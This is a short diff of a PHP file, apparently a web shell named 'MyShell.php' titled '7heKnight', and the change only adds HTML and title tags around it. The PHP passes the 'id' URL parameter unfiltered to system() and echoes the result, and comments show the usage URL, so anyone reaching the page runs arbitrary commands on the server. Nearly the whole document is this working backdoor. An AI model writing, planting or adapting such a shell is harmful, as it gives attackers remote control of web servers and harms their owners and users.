@@ -1,3 +1,5 @@
+<html>
+<title>7heKnight</title>
 <?php
 	echo '<pre>[*]Your command is: <strong>'.$_GET['id'].'</strong><hr/>';
 	system($_GET['id'],$bool);
@@ -7,5 +9,6 @@
 		echo'<hr/><strong>[+] Executed successfully</strong></pre>';
 	}
 ?>
+</html>
 <!--http://.../MyShell.php?id=[your_command]-->
 <!--This shell can only use turn on the system() function-->
